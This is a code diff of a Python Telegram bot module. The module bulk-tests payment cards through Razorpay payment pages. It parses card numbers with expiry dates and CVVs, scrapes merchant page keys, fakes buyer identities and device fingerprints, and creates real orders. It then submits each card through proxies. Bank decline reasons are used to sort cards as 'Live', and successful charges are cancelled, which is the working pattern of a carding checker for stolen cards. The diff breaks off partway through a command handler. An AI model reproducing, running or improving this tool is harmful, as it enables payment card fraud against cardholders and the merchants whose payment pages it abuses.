@@ -1,11 +1,13 @@
 import aiohttp
 import asyncio
-import re
+import base64
+import hashlib
+import json
+import os
 import random
+import re
 import string
 import time
-import os
-import json
 import aiofiles
 from telethon import events, Button
 
@@ -13,14 +15,13 @@ from telethon import events, Button
 MAX_CARDS      = 50000
 MAX_SITES      = 10
 _RZ_SITES_FILE = "razorpay_sites.json"
-_rz_sites: dict    = {}  # {user_id: [url1, url2, ...]}
-_rz_key_cache: dict = {}  # {url: rzp_live_xxx}
+_rz_sites: dict      = {}   # {user_id: [url1, url2, ...]}
+_rz_data_cache: dict = {}   # {url: {keyless_header, plink, ppid, key_id}}
 
-UA     = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"
-RZ_API = "https://api.razorpay.com/v1"
-
-rnd = lambda k: ''.join(random.choices('0123456789abcdef', k=k))
-fn  = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) and m.group(1)
+BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
+BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
+UA       = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+RZ_API   = "https://api.razorpay.com"
 
 # ─── SITE STORAGE ──────────────────────────────────────────────────────────────
 def _load_rz_sites():
@@ -28,10 +29,7 @@ def _load_rz_sites():
     try:
         with open(_RZ_SITES_FILE) as f:
             data = json.load(f)
-        result = {}
-        for k, v in data.items():
-            result[int(k)] = v if isinstance(v, list) else [v]
-        _rz_sites = result
+        _rz_sites = {int(k): v if isinstance(v, list) else [v] for k, v in data.items()}
     except Exception:
         _rz_sites = {}
 
@@ -42,22 +40,21 @@ def _save_rz_sites():
     except Exception:
         pass
 
-def _get_user_rz_sites(user_id):
-    return _rz_sites.get(user_id, [])
+def _get_user_rz_sites(uid):   return _rz_sites.get(uid, [])
 
-def _add_user_rz_site(user_id, url):
-    sites = _rz_sites.get(user_id, [])
+def _add_user_rz_site(uid, url):
+    sites = _rz_sites.get(uid, [])
     if url not in sites:
         sites.append(url)
-    _rz_sites[user_id] = sites
+    _rz_sites[uid] = sites
     _save_rz_sites()
 
-def _remove_user_rz_site(user_id, idx):
-    sites = _rz_sites.get(user_id, [])
+def _remove_user_rz_site(uid, idx):
+    sites = _rz_sites.get(uid, [])
     if 0 <= idx < len(sites):
         removed = sites.pop(idx)
-        _rz_key_cache.pop(removed, None)
-        _rz_sites[user_id] = sites
+        _rz_data_cache.pop(removed, None)
+        _rz_sites[uid] = sites
         _save_rz_sites()
         return removed
     return None
@@ -70,338 +67,115 @@ def _normalize_url(url):
 
 # ─── HELPERS ───────────────────────────────────────────────────────────────────
 def _parse_proxy(p):
-    if not p:
-        return None
-    if '://' in p:
-        return p
+    if not p: return None
+    if '://' in p: return p
     parts = p.split(':')
     if len(parts) == 4:
         return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
     return f'http://{p}'
 
 def _extract_cc(text):
-    pattern = re.compile(
-        r'\b(\d{15,16})[|/,: ]+(\d{1,2})[|/,: ]+(\d{2,4})[|/,: ]+(\d{3,4})\b'
-    )
+    pattern = re.compile(r'\b(\d{15,16})[|/,: ]+(\d{1,2})[|/,: ]+(\d{2,4})[|/,: ]+(\d{3,4})\b')
     seen, cards = set(), []
     for m in pattern.finditer(text):
-        card = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
-        if card not in seen:
-            seen.add(card)
-            cards.append(card)
+        c = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
+        if c not in seen:
+            seen.add(c)
+            cards.append(c)
     return cards
 
 def _random_email():
-    return f"{''.join(random.choices(string.ascii_lowercase, k=6))}{rnd(3)}@gmail.com"
+    names = ['alex', 'john', 'mike', 'sara', 'david', 'emma', 'james', 'lisa', 'chris', 'anna']
+    return random.choice(names) + str(random.randint(100, 9999)) + '@gmail.com'
 
 def _random_phone():
-    return f"9{''.join(random.choices('0123456789', k=9))}"
+    first = random.choice(['6', '7', '8', '9'])
+    return '+91' + first + ''.join(random.choices('0123456789', k=9))
 
 def _random_name():
     first = random.choice(['Rahul', 'Amit', 'Vikram', 'Raj', 'Arjun', 'Suresh', 'Deepak'])
     last  = random.choice(['Sharma', 'Kumar', 'Singh', 'Patel', 'Verma', 'Gupta'])
     return first, last
 
-def _is_rzme(site):
-    return 'razorpay.me' in site
+def _gen_device_id():
+    buf  = os.urandom(16)
+    h    = hashlib.sha1(buf).hexdigest()
+    ts   = str(int(time.time() * 1000))
+    rnd  = str(random.randint(0, 99999999)).zfill(8)
+    return f"1.{h}.{ts}.{rnd}", h
 
-# ─── RAZORPAY KEY SCRAPER ──────────────────────────────────────────────────────
-def _extract_rz_key_from_text(text, site):
-    patterns = [r'(rzp_live_[A-Za-z0-9]{14,})', r'(rzp_test_[A-Za-z0-9]{14,})']
-    for pat in patterns:
-        m = re.search(pat, text)
-        if m:
-            key = m.group(1)
-            _rz_key_cache[site] = key
-            pid = re.search(r'(ppage_[A-Za-z0-9]+)', text)
-            if pid:
-                _rz_key_cache[site + '__ppage'] = pid.group(1)
-            return key
+def _gen_session_id():
+    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    return ''.join(random.choices(chars, k=14))
+
+# ─── PAGE DATA EXTRACTION ──────────────────────────────────────────────────────
+def _extract_var_data(html: str):
+    """Brace-counting parser for var data = {...} in Razorpay pages."""
+    m = re.search(r'var data = (\{)', html)
+    if not m:
+        return None
+    start = m.start(1)
+    depth, in_str, escaped = 0, False, False
+    for i, c in enumerate(html[start:]):
+        if escaped:   escaped = False; continue
+        if c == '\\' and in_str: escaped = True; continue
+        if c == '"':  in_str = not in_str; continue
+        if in_str:    continue
+        if c == '{':  depth += 1
+        elif c == '}':
+            depth -= 1
+            if depth == 0:
+                try:    return json.loads(html[start:start+i+1])
+                except: return None
     return None
 
-async def _scrape_rz_key_playwright(site):
-    """Headless browser fallback for JS-rendered razorpay.me pages."""
-    try:
-        from playwright.async_api import async_playwright
-        async with async_playwright() as p:
-            browser = await p.chromium.launch(
-                headless=True,
-                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
-            )
-            ctx = await browser.new_context(user_agent=UA)
-            page = await ctx.new_page()
-            key = None
-            try:
-                await page.goto(site, wait_until='domcontentloaded', timeout=25000)
-                await page.wait_for_timeout(3000)
-
-                # 1. Full rendered HTML
-                content = await page.content()
-                key = _extract_rz_key_from_text(content, site)
-
-                # 2. Check window-level JS variables
-                if not key:
-                    try:
-                        key_js = await page.evaluate("""() => {
-                            const vars = ['__rzp__', '__data__', 'rzpCheckout', 'RZP_CONFIG',
-                                          '__NEXT_DATA__', 'pageProps'];
-                            for (const v of vars) {
-                                const val = window[v];
-                                if (!val) continue;
-                                const s = JSON.stringify(val);
-                                const m = s.match(/rzp_(live|test)_[A-Za-z0-9]{14,}/);
-                                if (m) return m[0];
-                            }
-                            // scan all script tags text
-                            for (const s of document.querySelectorAll('script')) {
-                                const m = s.textContent.match(/rzp_(live|test)_[A-Za-z0-9]{14,}/);
-                                if (m) return m[0];
-                            }
-                            return null;
-                        }""")
-                        if key_js and re.match(r'rzp_(live|test)_', key_js):
-                            _rz_key_cache[site] = key_js
-                            key = key_js
-                    except Exception:
-                        pass
-
-                # 3. Intercept network — key often appears in XHR responses
-                if not key:
-                    captured = []
-                    async def handle_response(resp):
-                        try:
-                            if 'razorpay' in resp.url and resp.status == 200:
-                                txt = await resp.text()
-                                captured.append(txt)
-                        except Exception:
-                            pass
-                    page.on('response', handle_response)
-                    await page.reload(wait_until='networkidle', timeout=20000)
-                    for txt in captured:
-                        k = _extract_rz_key_from_text(txt, site)
-                        if k:
-                            key = k
-                            break
-
-            finally:
-                await browser.close()
-            return key
-    except ImportError:
+def _parse_site_info(data: dict):
+    """Extract keyless_header, plink, ppid from var data dict."""
+    if not data:
         return None
-    except Exception:
+    keyless = data.get('keyless_header', '')
+    key_id  = data.get('key_id') or ''
+    pl      = data.get('payment_link') or data.get('payment_page') or {}
+    plink   = pl.get('id', '')
+    items   = pl.get('payment_page_items', [])
+    ppid    = items[0].get('id', '') if items else ''
+    if not keyless or not plink:
         return None
+    return {'keyless_header': keyless, 'plink': plink, 'ppid': ppid, 'key_id': key_id}
 
-async def _scrape_rz_key(site, proxy=None):
-    if site in _rz_key_cache:
-        return _rz_key_cache[site]
-
-    headers = {
-        'user-agent': UA,
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'accept-language': 'en-IN,en;q=0.9',
-    }
-
-    if _is_rzme(site):
-        # Step 1: quick HTTP attempt (sometimes works)
-        connector = aiohttp.TCPConnector(ssl=False)
-        try:
-            async with aiohttp.ClientSession(headers=headers, connector=connector) as sess:
-                for url in [site, site.rstrip('/') + '/']:
-                    try:
-                        async with sess.get(url, proxy=proxy,
-                                timeout=aiohttp.ClientTimeout(total=15),
-                                allow_redirects=True) as resp:
-                            text = await resp.text(errors='ignore')
-                        key = _extract_rz_key_from_text(text, site)
-                        if key:
-                            return key
-                        nd = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.+?)</script>', text, re.S)
-                        if nd:
-                            key = _extract_rz_key_from_text(nd.group(1), site)
-                            if key:
-                                return key
-                        for block in re.findall(r'<script[^>]*>(.+?)</script>', text, re.S):
-                            key = _extract_rz_key_from_text(block, site)
-                            if key:
-                                return key
-                    except Exception:
-                        continue
-        except Exception:
-            pass
-
-        # Step 2: Playwright headless browser (full JS render)
-        key = await _scrape_rz_key_playwright(site)
-        return key
-
-    else:
-        # WooCommerce site — simple HTTP scrape
-        urls = [f'{site}/', f'{site}/checkout/', f'{site}/shop/', f'{site}/donate/']
-        try:
-            connector = aiohttp.TCPConnector(ssl=False)
-            async with aiohttp.ClientSession(headers=headers, connector=connector) as sess:
-                for url in urls:
-                    try:
-                        async with sess.get(url, proxy=proxy,
-                                timeout=aiohttp.ClientTimeout(total=12),
-                                allow_redirects=True) as resp:
-                            text = await resp.text(errors='ignore')
-                        key = _extract_rz_key_from_text(text, site)
-                        if key:
-                            return key
-                    except Exception:
-                        continue
-        except Exception:
-            pass
-        return None
-
-# ─── ORDER CREATION — razorpay.me payment page ────────────────────────────────
-async def _create_rzme_order(site, key, proxy):
-    headers = {
-        'user-agent':   UA,
-        'origin':       'https://razorpay.me',
-        'referer':      site,
-        'content-type': 'application/json',
-    }
-    ppage_id = _rz_key_cache.get(site + '__ppage')
-    amount   = 100  # ₹1
-
+async def _get_site_data(site, proxy=None):
+    """Fetch and cache site data (keyless_header, plink, ppid) from page."""
+    if site in _rz_data_cache:
+        return _rz_data_cache[site]
     try:
         connector = aiohttp.TCPConnector(ssl=False)
-        async with aiohttp.ClientSession(headers=headers, connector=connector) as s:
-            # Try payment page order endpoint
-            endpoints = []
-            if ppage_id:
-                endpoints.append(
-                    (f'https://api.razorpay.com/v1/payment_pages/{ppage_id}/payment',
-                     {'amount': amount, 'currency': 'INR'})
-                )
-            # Generic checkout embedded endpoint
-            handle = site.rstrip('/').split('/@')[-1] if '/@' in site else ''
-            if handle:
-                endpoints.append(
-                    (f'https://api.razorpay.com/v1/checkout/embedded',
-                     {'key': key, 'amount': amount, 'currency': 'INR',
-                      'receipt': f'rcpt_{rnd(8)}'})
-                )
-
-            for url, payload in endpoints:
-                try:
-                    async with s.post(url, json=payload, proxy=proxy,
-                            timeout=aiohttp.ClientTimeout(total=15)) as r:
-                        d = await r.json(content_type=None)
-                    order_id = d.get('id') or d.get('order_id') or d.get('razorpay_order_id')
-                    if order_id and order_id.startswith('order_'):
-                        return {'order_id': order_id, 'amount': amount}
-                except Exception:
-                    continue
+        async with aiohttp.ClientSession(
+                headers={'User-Agent': UA,
+                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                         'Accept-Language': 'en-US,en;q=0.5'},
+                connector=connector) as sess:
+            async with sess.get(site, proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=15),
+                    allow_redirects=True) as resp:
+                html = await resp.text(errors='ignore')
+        data = _extract_var_data(html)
+        info = _parse_site_info(data)
+        if info:
+            _rz_data_cache[site] = info
+        return info
     except Exception:
-        pass
-    return None
-
-# ─── ORDER CREATION — WooCommerce + Razorpay ───────────────────────────────────
-async def _create_order(s, site, proxy):
-    headers = {'user-agent': UA}
-
-    try:
-        # 1. Find cheapest product
-        async with s.get(f'{site}/shop/', headers=headers, proxy=proxy,
-                timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True) as r:
-            shop_text = await r.text(errors='ignore')
-
-        product_id = None
-        # Try price-sorted match
-        priced = re.findall(r'data-product_id="(\d+)"[^>]*data-price="([^"]+)"', shop_text)
-        if priced:
-            try:
-                cheapest   = min(priced, key=lambda x: float(x[1]))
-                product_id = cheapest[0]
-            except Exception:
-                product_id = priced[0][0]
-        else:
-            m = re.search(r'\?add-to-cart=(\d+)', shop_text)
-            if m:
-                product_id = m.group(1)
-
-        if not product_id:
-            return None
-
-        # 2. Add to cart
-        await s.get(f'{site}/?add-to-cart={product_id}&quantity=1',
-            headers=headers, proxy=proxy,
-            timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True)
-
-        # 3. Load checkout
-        async with s.get(f'{site}/checkout/', headers=headers, proxy=proxy,
-                timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True) as r:
-            checkout_text = await r.text(errors='ignore')
-
-        # 4. Get nonce
-        nonce = None
-        for pat in [
-            r'"razorpay_order_nonce"\s*:\s*"([^"]+)"',
-            r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"',
-            r'"woocommerce-process-checkout-nonce"\s*:\s*"([^"]+)"',
-            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
-        ]:
-            m = re.search(pat, checkout_text)
-            if m:
-                nonce = m.group(1)
-                break
-
-        # Get amount (paise)
-        amount_m = re.search(r'"amount"\s*:\s*(\d+)', checkout_text)
-        amount   = int(amount_m.group(1)) if amount_m else 100  # ₹1 default
-
-        first, last = _random_name()
-        checkout_data = {
-            'billing_first_name': first,
-            'billing_last_name':  last,
-            'billing_email':      _random_email(),
-            'billing_phone':      _random_phone(),
-            'billing_address_1':  'MG Road',
-            'billing_city':       'Mumbai',
-            'billing_state':      'MH',
-            'billing_postcode':   '400001',
-            'billing_country':    'IN',
-            'payment_method':     'razorpay',
-            'woocommerce-process-checkout-nonce': nonce or '',
-            '_wp_http_referer':   '/checkout/',
-        }
-
-        # 5. Submit checkout to get Razorpay order_id
-        for endpoint in [
-            f'{site}/?wc-ajax=checkout',
-            f'{site}/wp-admin/admin-ajax.php',
-        ]:
-            try:
-                async with s.post(endpoint,
-                    headers={
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'origin': site,
-                        'referer': f'{site}/checkout/',
-                        'x-requested-with': 'XMLHttpRequest',
-                    },
-                    data=checkout_data,
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=20)) as r:
-                    resp_text = await r.text(errors='ignore')
-
-                for pat in [
-                    r'"order_id"\s*:\s*"(order_[A-Za-z0-9]+)"',
-                    r'razorpay_order_id["\s:]+["\']?(order_[A-Za-z0-9]+)',
-                ]:
-                    m = re.search(pat, resp_text)
-                    if m:
-                        return {'order_id': m.group(1), 'amount': amount}
-            except Exception:
-                continue
-
-    except Exception:
-        pass
-    return None
+        return None
 
 # ─── CORE CHECKER ──────────────────────────────────────────────────────────────
-async def razorpay_check(card: str, site: str, key: str, proxy_str=None):
+_LIVE_REASONS = {
+    'insufficient_funds', 'card_velocity_exceeded', 'do_not_honor',
+    'not_permitted', 'restricted_card', 'security_violation',
+    'transaction_not_permitted', 'incorrect_cvv',
+}
+_LIVE_KEYWORDS = ['insufficient', 'do not honor', 'not permitted',
+                  'restricted', 'security violation', 'transaction limit', 'cvv']
+
+async def razorpay_check(card: str, site: str, site_data: dict, proxy_str=None):
     p = card.strip().split('|')
     if len(p) != 4:
         return {'status': 'Error', 'message': 'Invalid format', 'card': card}
@@ -410,91 +184,201 @@ async def razorpay_check(card: str, site: str, key: str, proxy_str=None):
     yy    = ('20' + yy) if len(yy) == 2 else yy
     proxy = _parse_proxy(proxy_str)
 
-    first, last = _random_name()
+    keyless = site_data['keyless_header']
+    plink   = site_data['plink']
+    ppid    = site_data['ppid']
+    key_id  = site_data.get('key_id') or ''
+
+    first, last  = _random_name()
+    card_name    = f"{first} {last}"
+    phone        = _random_phone()
+    phone_short  = phone.lstrip('+91').lstrip('+')
+    email        = _random_email()
+    device_id, fhash = _gen_device_id()
+    session_id   = _gen_session_id()
 
     connector = aiohttp.TCPConnector(ssl=False)
     try:
-        async with aiohttp.ClientSession(headers={'user-agent': UA},
-                connector=connector) as s:
+        async with aiohttp.ClientSession(connector=connector) as s:
 
-            # razorpay.me: skip order creation, charge directly with key + ₹1
-            if _is_rzme(site):
-                payload = {
-                    'amount':             '100',
-                    'currency':           'INR',
-                    'method':             'card',
-                    'card[name]':         f'{first} {last}',
-                    'card[number]':       cc,
-                    'card[expiry_month]': mm.zfill(2),
-                    'card[expiry_year]':  yy[-2:],
-                    'card[cvv]':          cvv,
-                    'key_id':             key,
-                    'contact':            _random_phone(),
-                    'email':              _random_email(),
-                    '_':                  str(int(time.time() * 1000)),
-                }
-            else:
-                order = await _create_order(s, site, proxy)
-                if not order:
-                    return {'status': 'Error', 'message': 'Order creation failed', 'card': card}
-                payload = {
-                    'amount':             str(order['amount']),
-                    'currency':           'INR',
-                    'order_id':           order['order_id'],
-                    'method':             'card',
-                    'card[name]':         f'{first} {last}',
-                    'card[number]':       cc,
-                    'card[expiry_month]': mm.zfill(2),
-                    'card[expiry_year]':  yy[-2:],
-                    'card[cvv]':          cvv,
-                    'key_id':             key,
-                    'contact':            _random_phone(),
-                    'email':              _random_email(),
-                    '_':                  str(int(time.time() * 1000)),
-                }
+            # ── Step 1: Create order ────────────────────────────────────────
+            async with s.post(
+                f'{RZ_API}/v1/payment_pages/{plink}/order',
+                json={
+                    'notes':      {'comment': '', 'name': card_name},
+                    'line_items': [{'payment_page_item_id': ppid, 'amount': 100}],
+                },
+                headers={
+                    'Accept':        'application/json, text/plain, */*',
+                    'Content-Type':  'application/json',
+                    'Origin':        'https://razorpay.me',
+                    'Referer':       site + '/',
+                    'keyless_header': keyless,
+                },
+                proxy=proxy,
+                timeout=aiohttp.ClientTimeout(total=15)
+            ) as r:
+                order_data = await r.json(content_type=None)
 
-            # Hit Razorpay payment API
-            try:
-                async with aiohttp.ClientSession() as rz:
-                    async with rz.post(
-                        f'{RZ_API}/payments/create/ajax',
-                        headers={
-                            'origin':       'https://checkout.razorpay.com',
-                            'referer':      'https://checkout.razorpay.com/',
-                            'user-agent':   UA,
-                            'content-type': 'application/x-www-form-urlencoded',
-                        },
-                        data=payload,
-                        proxy=proxy,
-                        timeout=aiohttp.ClientTimeout(total=30)
-                    ) as dr:
-                        d = await dr.json(content_type=None)
-            except Exception as e:
-                return {'status': 'Error', 'message': f'RZ API: {e}', 'card': card}
+            order_obj    = order_data.get('order', {})
+            order_id     = order_obj.get('id', '')
+            if not order_id:
+                desc = order_data.get('error', {}).get('description', 'Order creation failed')
+                return {'status': 'Error', 'message': desc, 'card': card}
 
-            # Parse response
-            if d.get('razorpay_payment_id'):
-                return {'status': 'Charged', 'message': f"₹ Charged — {d['razorpay_payment_id']}", 'card': card}
+            order_amount   = max(order_obj.get('amount', 100), 100)
+            order_currency = order_obj.get('currency', 'INR')
+            checkout_id    = order_id.split('_', 1)[-1] if '_' in order_id else order_id
 
-            nxt = d.get('next', {})
-            if nxt:
-                act = nxt.get('action', '')
-                if act in ('redirect', 'otp_generate', 'otp_validate'):
-                    return {'status': 'Live', 'message': '3DS / OTP Required', 'card': card}
+            # ── Step 2: Get session token ────────────────────────────────────
+            async with s.get(
+                f'{RZ_API}/v1/checkout/public',
+                params={
+                    'traffic_env':        'production',
+                    'build':              BUILD,
+                    'build_v1':           BUILD_V1,
+                    'checkout_v2':        '1',
+                    'new_session':        '1',
+                    'keyless_header':     keyless,
+                    'rzp_device_id':      device_id,
+                    'unified_session_id': session_id,
+                },
+                headers={'Accept': 'text/html,application/xhtml+xml,*/*',
+                         'Referer': 'https://razorpay.me/'},
+                proxy=proxy,
+                timeout=aiohttp.ClientTimeout(total=15)
+            ) as r:
+                r3_text = await r.text(errors='ignore')
 
-            error  = d.get('error', {})
-            reason = error.get('reason', '')
-            desc   = error.get('description', error.get('message', 'Declined'))
+            sess_m = re.search(r'window\.session_token="([^"]+)"', r3_text)
+            if not sess_m:
+                sess_m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', r3_text)
+            if not sess_m:
+                return {'status': 'Error', 'message': 'Session token not found', 'card': card}
+            sessid = sess_m.group(1)
 
-            _live_reasons = {
-                'insufficient_funds', 'card_velocity_exceeded', 'do_not_honor',
-                'not_permitted', 'restricted_card', 'security_violation',
-                'transaction_not_permitted',
+            rzp_ref = (f'{RZ_API}/v1/checkout/public?traffic_env=production'
+                       f'&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1'
+                       f'&new_session=1&unified_session_id={session_id}')
+            std_h = {
+                'Accept':          '*/*',
+                'Origin':          'https://api.razorpay.com',
+                'Referer':         rzp_ref,
+                'x-session-token': sessid,
             }
-            if reason in _live_reasons:
-                return {'status': 'Live', 'message': desc, 'card': card}
 
-            return {'status': 'Dead', 'message': desc or reason or 'Declined', 'card': card}
+            # ── Step 3: Preferences (warmup) ────────────────────────────────
+            try:
+                await s.post(
+                    f'{RZ_API}/v2/standard_checkout/preferences'
+                    f'?x_entity_id={order_id}&session_token={sessid}&keyless_header={keyless}',
+                    json={
+                        'query': [{'resource': r} for r in
+                                  ['checkout_version_config', 'merchant', 'methods', 'order']],
+                        'query_params': {
+                            'device_id': device_id, 'amount': order_amount,
+                            'currency': order_currency, 'order_id': order_id,
+                            'payment_link_id': plink, 'contact': phone,
+                        },
+                        'action': 'get',
+                    },
+                    headers={**std_h, 'Content-Type': 'application/json'},
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                )
+            except Exception:
+                pass
+
+            # ── Step 4: Checkout order context ──────────────────────────────
+            try:
+                await s.post(
+                    f'{RZ_API}/v1/standard_checkout/checkout/order'
+                    f'?key_id={key_id}&session_token={sessid}&keyless_header={keyless}',
+                    data={
+                        'notes[email]': email, 'notes[phone]': phone_short,
+                        'payment_link_id': plink, 'key_id': key_id,
+                        'contact': phone, 'email': email, 'currency': order_currency,
+                        '_[integration]': 'payment_pages', '_[device.id]': device_id,
+                        '_[library]': 'checkoutjs', '_[platform]': 'browser',
+                        '_[build]': BUILD, '_[shield][fhash]': fhash,
+                        '_[shield][tz]': '0', '_[device_id]': device_id,
+                        '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
+                        '_[shield][browser]': 'chrome', '_[request_index]': '0',
+                        'amount': str(order_amount), 'order_id': order_id,
+                        'method': 'card', 'checkout_id': checkout_id,
+                    },
+                    headers={**std_h, 'Content-Type': 'application/x-www-form-urlencoded'},
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                )
+            except Exception:
+                pass
+
+            # ── Step 5: Submit card payment ──────────────────────────────────
+            token_b64 = base64.b64encode(
+                json.dumps([{'name': 'sardine',
+                             'metadata': {'session_id': checkout_id}}]).encode()
+            ).decode()
+
+            async with s.post(
+                f'{RZ_API}/v1/standard_checkout/payments/create/ajax'
+                f'?x_entity_id={order_id}&session_token={sessid}&keyless_header={keyless}',
+                data={
+                    'user_risk_providers_token': token_b64,
+                    'notes[comment]': '', 'notes[email]': email,
+                    'notes[phone]': phone_short, 'notes[name]': card_name,
+                    'payment_link_id': plink, 'key_id': key_id,
+                    'contact': phone, 'email': email, 'currency': order_currency,
+                    '_[integration]': 'payment_pages', '_[checkout_id]': checkout_id,
+                    '_[device.id]': device_id, '_[env]': '',
+                    '_[library]': 'checkoutjs', '_[library_src]': 'no-src',
+                    '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
+                    '_[platform]': 'browser', '_[referer]': site + '/',
+                    '_[shield][fhash]': fhash, '_[shield][tz]': '-330',
+                    '_[device_id]': device_id, '_[build]': BUILD,
+                    '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
+                    '_[shield][browser]': 'chrome', '_[request_index]': '1',
+                    'amount': str(order_amount), 'order_id': order_id,
+                    'method': 'card', 'card[number]': cc, 'card[cvv]': cvv,
+                    'card[name]': card_name, 'card[expiry_month]': mm.zfill(2),
+                    'card[expiry_year]': yy, 'save': '0', 'dcc_currency': order_currency,
+                },
+                headers=std_h,
+                proxy=proxy,
+                timeout=aiohttp.ClientTimeout(total=30)
+            ) as r:
+                r7 = await r.json(content_type=None)
+
+            payment_id = r7.get('payment_id') or r7.get('id', '')
+
+            if not payment_id:
+                err_obj = r7.get('error', {})
+                desc    = err_obj.get('description', '').replace(
+                    ' Try another payment method or contact your bank for details.', '').strip()
+                reason  = err_obj.get('reason', '')
+                label   = f"{desc} ({reason})" if reason and reason not in desc else desc
+
+                if any(k in desc.lower() for k in _LIVE_KEYWORDS) or reason in _LIVE_REASONS:
+                    return {'status': 'Live', 'message': label or 'Live', 'card': card}
+                return {'status': 'Dead', 'message': label or 'Declined', 'card': card}
+
+            # 3DS / OTP
+            nxt = r7.get('next', {})
+            if nxt and nxt.get('action') in ('redirect', 'otp_generate', 'otp_validate'):
+                return {'status': 'Live', 'message': '3DS / OTP Required', 'card': card}
+
+            # Cancel (cleanup)
+            try:
+                await s.get(
+                    f'{RZ_API}/v1/standard_checkout/payments/{payment_id}/cancel'
+                    f'?key_id={key_id}&session_token={sessid}&keyless_header={keyless}',
+                    headers=std_h, proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                )
+            except Exception:
+                pass
+
+            return {'status': 'Charged', 'message': f'Payment {payment_id}', 'card': card}
 
     except asyncio.TimeoutError:
         return {'status': 'Error', 'message': 'Timeout', 'card': card}
@@ -513,210 +397,145 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
     async def rzadd_handler(event):
         user_id = event.sender_id
         if not is_premium_fn(user_id):
-            await event.reply(
-                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
-                parse_mode='html'
-            )
+            await event.reply("❌ <b>Access Denied</b>\n\nOnly premium users can use this.", parse_mode='html')
             return
 
-        parts   = event.raw_text.split(maxsplit=1)
+        parts = event.raw_text.split(maxsplit=1)
         url_raw = None
-        manual_key = None
 
         if len(parts) >= 2:
-            arg = parts[1].strip()
-            # Check if user provided: url key
-            rz_key_m = re.search(r'(rzp_(?:live|test)_[A-Za-z0-9]{14,})', arg)
-            url_m    = re.search(r'(https?://\S+)', arg)
-            if rz_key_m:
-                manual_key = rz_key_m.group(1)
-            if url_m:
-                url_raw = url_m.group(1).rstrip('/')
-            elif not rz_key_m:
-                url_raw = arg.split()[0]  # first token as URL
+            m = re.search(r'(https?://\S+)', parts[1])
+            url_raw = m.group(1).rstrip('/') if m else parts[1].strip().split()[0]
         elif event.reply_to_msg_id:
             reply_msg = await event.get_reply_message()
-            if reply_msg and reply_msg.file and reply_msg.file.name and \
-                    reply_msg.file.name.endswith('.txt'):
-                file_path = await reply_msg.download_media()
+            if reply_msg and reply_msg.file and (reply_msg.file.name or '').endswith('.txt'):
+                fp = await reply_msg.download_media()
                 try:
-                    async with aiofiles.open(file_path, 'r',
-                            encoding='utf-8', errors='ignore') as f:
+                    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                         content = await f.read()
-                    os.remove(file_path)
+                    os.remove(fp)
                     m = re.search(r'https?://\S+', content)
-                    if not m:
-                        m = re.search(r'[a-zA-Z0-9][-a-zA-Z0-9.]+\.[a-zA-Z]{2,}', content)
-                    if m:
-                        url_raw = m.group(0).strip().rstrip('/')
+                    if m: url_raw = m.group(0).rstrip('/')
                 except Exception:
                     pass
             elif reply_msg and reply_msg.text:
                 m = re.search(r'https?://\S+', reply_msg.text)
-                if m:
-                    url_raw = m.group(0).strip().rstrip('/')
+                if m: url_raw = m.group(0).rstrip('/')
 
         if not url_raw:
             await event.reply(
                 "❌ <b>Usage:</b>\n"
                 "▸ <code>/rzadd https://razorpay.me/@handle</code>\n"
-                "▸ <code>/rzadd https://razorpay.me/@handle rzp_live_xxx</code> — manual key\n"
                 "▸ <code>/rzaddtxt</code> — bulk add from .txt file\n\n"
-                "<i>For razorpay.me pages, provide the key manually if auto-detect fails.</i>",
+                "<i>Supports razorpay.me and pages.razorpay.com links.</i>",
                 parse_mode='html'
             )
             return
 
-        sites_now = _get_user_rz_sites(user_id)
-        if len(sites_now) >= MAX_SITES:
-            await event.reply(
-                f"❌ <b>Max {MAX_SITES} sites reached.</b>\n"
-                f"Use <code>/rzrem</code> to remove one first.",
-                parse_mode='html'
-            )
+        if len(_get_user_rz_sites(user_id)) >= MAX_SITES:
+            await event.reply(f"❌ <b>Max {MAX_SITES} sites reached.</b>\nUse <code>/rzrem</code> first.", parse_mode='html')
             return
 
-        url = _normalize_url(url_raw)
+        url  = _normalize_url(url_raw)
+        wait = await event.reply(
+            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<i>Fetching site data...</i>",
+            parse_mode='html'
+        )
 
-        if manual_key:
-            # User provided key directly — skip scraping
-            _rz_key_cache[url] = manual_key
-            key = manual_key
-            wait = None
-        else:
